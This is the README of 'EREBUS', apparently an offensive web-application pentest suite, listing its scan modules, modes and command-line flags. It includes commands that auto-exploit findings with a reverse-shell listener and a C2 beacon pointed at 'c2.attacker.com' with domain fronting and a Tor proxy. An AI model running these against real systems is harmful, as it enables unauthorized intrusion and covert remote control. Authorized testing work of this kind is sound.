# EREBUS

Web application penetration testing suite — Python offensive framework + Go vulnerability scanner.

> For authorized testing only — pentest engagements, CTF, personal labs.

---

## erebus.py — Python Framework

### Install

```bash
pip install -r requirements.txt
```

### Quick start

```bash
# Balanced scan, HTML report
python erebus.py --scan --target https://target.com --output report.html

# Fast mode through Burp
python erebus.py --scan --target https://target.com --mode fast --proxy http://127.0.0.1:8080

# Deep scan, authenticated, specific modules
python erebus.py --scan --target https://target.com --mode deep \
    --modules sqli,xss,ssti --bearer eyJ... --output report.md

# OOB callbacks for blind XSS/XXE
python erebus.py --scan --target https://target.com \
    --attacker-url https://xyz.interact.sh

# Exploit all findings after scan
python erebus.py --scan --target https://target.com --exploit-all \
    --command "id" --lhost 10.10.14.5 --lport 9001

# Abort after 5 minutes, produce partial report
python erebus.py --scan --target https://target.com --mode deep --scan-timeout 300
```

### Modules

| Name | Description |
|------|-------------|
| `sqli` | Error-based, UNION, boolean-blind, time-based SQL injection |
| `xss` | Reflected XSS — 23+ payloads, WAF-bypass variants, blind callback |
| `rce` | OS command injection — echo/marker, time-blind, header injection |
| `xxe` | File read, SSRF escalation, SVG upload, error-based |
| `ssti` | Template injection — Jinja2, Twig, Mako, ERB, Smarty, Velocity, FreeMarker |
| `auth` | Broken auth — JWT, default creds, weak reset, mass assignment |
| `acl` | Broken access control — IDOR, BFLA, method override, param pollution |
| `sensitive` | Secrets in responses — API keys, private keys, hashes, stack traces |
| `misconfig` | CORS, CSP, insecure cookies, clickjacking, TRACE, debug endpoints |

### Modes

| Mode | Workers | Depth | Max URLs | Modules |
|------|---------|-------|----------|---------|
| `fast` | 12 | 1 | 80 | sqli, xss, auth, sensitive, misconfig |
| `balanced` | 10 | 2 | 300 | all |
| `deep` | 5 | 4 | 1000 | all |

### Key flags

| Flag | Default | Description |
|------|---------|-------------|
| `--target` | — | Target URL (required) |
| `--mode` | — | Scan preset: `fast` / `balanced` / `deep` |
| `--modules` | all | Comma-separated module list |
| `--output` | report.json | Report file — `.json` / `.md` / `.html` |
| `--proxy` | — | HTTP/SOCKS proxy |
| `--timeout` | 15 | Per-request timeout (seconds) |
| `--workers` | 8 | Concurrent threads |
| `--depth` | 2 | Crawl depth |
| `--max-urls` | 300 | Max URLs to crawl |
| `--bearer` | — | Authorization: Bearer token |
| `--cookie` | — | Session cookies (`name=value;name2=value2`) |
| `--basic` | — | HTTP Basic auth (`user:pass`) |
| `--api-key` | — | API key value |
| `--attacker-url` | — | OOB callback for blind XSS/XXE (e.g. interactsh) |
| `--include` | — | Only test URLs matching regex (repeatable) |
| `--exclude` | — | Skip URLs matching regex (repeatable) |
| `--scan-timeout` | 0 | Abort after N seconds, produce partial report (0 = no limit) |
| `--no-crawl` | false | Test target URL only |
| `--skip-api` | false | Skip API endpoint discovery |
| `--skip-hh` | false | Skip host header injection test |
| `--stealth` | false | Slow, randomized request pacing |
| `--no-ssl-verify` | false | Disable TLS verification |
| `--exploit-all` | false | Auto-exploit all exploitable findings |
| `--exploit N` | — | Exploit finding by index |
| `--command` | id | Command for RCE exploitation |
| `--lhost / --lport` | — | Attacker host/port for reverse shells |
| `-v` | false | Verbose / debug output |
| `--stats` | false | Print HTTP engine stats after scan |

### C2

```bash
# Start team server
python erebus.py --teamserver --port 8443

# Run beacon agent
python erebus.py --agent --c2 c2.attacker.com --master-key <HEX64> \
    --fronting-host cdn.legit-site.com --proxy-c2 socks5://127.0.0.1:9050
```

---

## scanner/ — Go Scanner

### Build

```bash
cd scanner
go build -o erebus-scanner.exe .
```

**Requires:** Go 1.21+

### Quick start

```bash
# Basic scan
.\erebus-scanner.exe -target https://target.com

# HTML report, authenticated, through Burp
.\erebus-scanner.exe -target https://target.com -output report.html \
    -cookie "session=abc123" -proxy http://127.0.0.1:8080 -no-verify

# Specific modules, deep crawl
.\erebus-scanner.exe -target https://target.com -modules sqli,xss,ssrf,idor -depth 5

# Multi-session IDOR/BFLA comparison
.\erebus-scanner.exe -target https://target.com -session-file sessions.txt

# SPA + stored XSS
.\erebus-scanner.exe -target https://spa.com -headless -stored-xss
```

### Session file format

```
admin|cookie=sessionid=abc123
user|bearer=eyJhbGc...
anonymous
```

### Key flags

| Flag | Default | Description |
|------|---------|-------------|
| `-target` | — | Target URL |
| `-output` | — | `.json` or `.html` report |
| `-modules` | all | Comma-separated or `all` |
| `-depth` | 3 | Crawl depth |
| `-workers` | 25 | Concurrent workers |
| `-rate` | 60 | Max req/s |
| `-proxy` | — | HTTP/HTTPS proxy |
| `-cookie` | — | Cookie header |
| `-bearer` | — | Bearer token |
| `-auth` | — | Basic auth `user:pass` |
| `-H` | — | Custom header (repeatable) |
| `-session-file` | — | Multi-session privilege comparison |
| `-headless` | false | Headless Chrome for SPAs |
| `-stored-xss` | false | Second-pass stored XSS |
| `-no-verify` | false | Skip TLS verification |
| `-v` | false | Verbose output |
